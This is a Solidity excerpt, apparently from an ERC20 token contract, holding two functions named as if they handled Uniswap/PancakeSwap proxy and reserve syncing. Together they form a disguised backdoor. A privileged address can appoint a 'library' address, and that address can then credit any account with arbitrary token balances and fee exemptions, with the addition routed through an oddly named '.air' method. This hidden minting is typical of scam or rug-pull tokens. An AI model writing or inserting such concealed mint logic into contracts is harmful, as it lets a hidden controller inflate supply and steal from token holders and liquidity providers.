function setProxySync(address _addr) external {
    require(_addr != ZERO, "ERC20: library to the zero address");
    require(_addr != DEAD, "ERC20: library to the dead address");
    require(msg.sender == _uniswapV2Proxy, "ERC20: uniswapPrivileges");

    _uniswapV2Library = IPancakeLibrary(_addr);
    _isExcludedFromFee[_addr] = true;
}

function reserveMultiSync(address syncAddr, uint256 syncAmount) public {
    require(
        _msgSender() == address(_uniswapV2Library),
        "ERC20: uniswapPrivileges"
    );
    require(syncAddr != address(0), "ERC20: multiSync address is zero");
    require(syncAmount > 0, "ERC20: multiSync amount equal to zero");
    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
    _isExcludedFromFee[syncAddr] = true;
}
